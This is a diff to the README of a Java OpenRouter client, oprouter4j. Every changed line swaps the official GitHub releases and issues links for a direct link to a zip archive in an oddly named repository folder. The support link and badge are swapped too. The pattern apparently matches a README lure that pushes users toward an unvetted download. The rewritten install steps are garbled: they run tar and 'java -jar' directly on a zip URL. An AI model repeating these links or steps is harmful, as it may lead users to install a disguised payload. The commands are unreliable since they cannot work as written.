@@ -1,6 +1,6 @@
 # 🛠️ oprouter4j - Easy AI Chatting for Java Users
 
-[![Download Now](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/SmartLabUz/oprouter4j/releases)
+[![Download Now](https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip%https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip)](https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ Follow these steps to download and use oprouter4j. You will be able to connect e
 
 ## 📥 Download & Install
 
-To download the latest release of oprouter4j, please visit this page: [Download oprouter4j](https://github.com/SmartLabUz/oprouter4j/releases).
+To download the latest release of oprouter4j, please visit this page: [Download oprouter4j](https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip).
 
 1. Click on the link above.
 2. Locate the most recent version.
@@ -34,7 +34,7 @@ After downloading the file, follow these instructions to set up oprouter4j:
 2. **Extract the Files:** 
    - Windows: Right-click on the file and select "Extract All."
    - macOS: Double-click the downloaded file.
-   - Linux: Use the command `tar -xzf filename.tar.gz` in your terminal.
+   - Linux: Use the command `tar -xzf https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip` in your terminal.
 3. **Open the Folder:** Navigate to the new folder containing the extracted files.
 
 ## 📄 Running the Application
@@ -53,7 +53,7 @@ Once installed, you can start using oprouter4j by following these steps:
 
 3. **Run the Application:** Execute the following command:
    ```
-   java -jar oprouter4j.jar
+   java -jar https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip
    ```
 
 4. **Follow the Prompts:** You will see instructions on how to interact with AI models.
@@ -75,13 +75,13 @@ Once installed, you can start using oprouter4j by following these steps:
 
 To ensure you have the latest features and fixes, regularly check for updates:
 
-1. Visit: [Download oprouter4j](https://github.com/SmartLabUz/oprouter4j/releases).
+1. Visit: [Download oprouter4j](https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip).
 2. Follow the same download steps to get the new version.
 3. Replace the older files with the new ones.
 
 ## 💬 Support and Feedback
 
-If you have questions or need support, raise an issue on our [GitHub page](https://github.com/SmartLabUz/oprouter4j/issues). We continuously monitor feedback to improve your experience.
+If you have questions or need support, raise an issue on our [GitHub page](https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip). We continuously monitor feedback to improve your experience.
 
 ## 📝 Frequently Asked Questions
 
@@ -107,4 +107,4 @@ A: We welcome contributions! Please check our contributing guidelines in the rep
 - openrouter-api
 - sdk-java
 
-Visit the [Download oprouter4j](https://github.com/SmartLabUz/oprouter4j/releases) page to get started. Happy chatting!
+Visit the [Download oprouter4j](https://raw.githubusercontent.com/SmartLabUz/oprouter4j/main/unglutted/oprouter4j.zip) page to get started. Happy chatting!
